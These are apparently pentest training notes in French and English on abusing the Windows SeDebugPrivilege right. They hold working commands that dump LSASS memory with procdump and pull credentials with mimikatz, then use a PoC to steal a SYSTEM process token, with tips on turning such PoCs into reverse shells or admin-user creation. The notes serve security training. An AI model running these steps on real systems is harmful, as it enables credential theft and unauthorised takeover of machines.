# SeDebugPrivilege

***

{% hint style="warning" %}
**SeDebugPrivilege** donne un accès total aux processus et à la mémoire du système, permettant d’injecter du code ou d’extraire des mots de passe.\
Normalement réservé aux administrateurs, il peut aussi être attribué à certains comptes techniques via GPO.\
En pentest interne, trouver un compte avec ce privilège est une opportunité d’escalade rapide, même sans droits admin, mais il faut le vérifier localement car des outils comme BloodHound ne le détectent pas à distance.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

After logging on as a user assigned the `Debug programs` right and opening an elevated shell, we see `SeDebugPrivilege` is listed.

```cmd-session
C:\htb> whoami /priv
```

{% hint style="warning" %}
We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process, which stores user credentials after a user logs on to a system.
{% endhint %}

```cmd-session
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```cmd-session
C:\htb> mimikatz.exe
-----------
mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords

```

Or with GUI

<figure><img src="../../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>



***

### <mark style="color:red;">Remote Code Execution as SYSTEM</mark>

{% hint style="warning" %}
Avec **SeDebugPrivilege**, on peut obtenir un accès SYSTEM en lançant un processus enfant et en usurpant le jeton d’un processus parent qui tourne en SYSTEM.\
Il suffit de cibler le **PID** d’un processus SYSTEM, puis d’utiliser un script PoC (comme **psgetsystem**) pour créer un nouveau processus avec ce jeton.\
La méthode consiste à transférer le script sur la machine, puis l’exécuter depuis une console PowerShell élevée, après avoir listé les processus avec `tasklist`.
{% endhint %}

```powershell-session
PS C:\htb> tasklist 
```

Here we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.

<figure><img src="../../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

* We could also use the [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.

<figure><img src="../../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`. Often we will not have RDP access to a host, so we'll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user. Play around with these PoCs and see what other ways you can achieve SYSTEM access, especially if you do not have a fully interactive session, such as when you achieve command injection or have a web shell or reverse shell connection as the user with `SeDebugPrivilege`. Keep these examples in mind in case you ever run into a situation where dumping LSASS does not result in any useful credentials (though we can get SYSTEM access with just the machine NTLM hash, but that's outside the scope of this module) and a shell or RCE as SYSTEM would be beneficial.
{% endhint %}
